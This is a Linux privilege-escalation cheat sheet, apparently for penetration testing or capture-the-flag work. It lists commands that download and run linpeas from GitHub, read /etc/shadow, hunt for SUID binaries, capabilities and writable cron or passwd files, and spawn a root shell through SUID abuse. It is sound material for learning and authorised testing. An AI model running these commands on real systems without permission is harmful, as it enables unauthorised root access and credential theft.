# Linux Permissions & Privilege Escalation

### Run linpeas for automated enumeration

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

**Use when:** First thing after landing a shell — automates most of the manual checks below.

---

### Check sudo privileges

```
sudo -l
```

**Use when:** Always check this early — a misconfigured sudo rule is the fastest privesc path.

---

### Find SUID binaries

```
find / -perm -4000 -type f 2>/dev/null
```

**Use when:** Hunting for binaries that run as owner (often root) regardless of who executes them.

**Note:** Cross-reference results against GTFOBins for a known privesc technique.

---

### Check for writable /etc/passwd

```
ls -la /etc/passwd
```

**Use when:** If writable, you can add a new root-equivalent user directly.

---

### Check cron jobs

```
cat /etc/crontab
ls -la /etc/cron.*
```

**Use when:** Looking for a root-run scheduled script that's writable by your current user.

---

### Check for exploitable capabilities

```
getcap -r / 2>/dev/null
```

**Use when:** SUID checks come up empty — Linux capabilities can grant privesc too (e.g. `cap_setuid`).

---

### Check kernel version for known exploits

```
uname -a
searchsploit linux kernel <version>
```

**Use when:** No easy misconfig found — a kernel exploit may be the path (use carefully, can crash the box).

---

### Check for readable/writable sensitive files

```
find / -writable -type d 2>/dev/null
cat /etc/shadow 2>/dev/null
```

**Use when:** Broad sweep for misconfigured permissions after the standard checks are exhausted.

---

### GTFOBins-style SUID abuse example

```
./<suid-binary> -p
```

**Use when:** A GTFOBins-listed SUID binary is found (e.g. `find`, `vim`, `less`, `nmap`) — most have a documented one-liner to spawn a root shell.
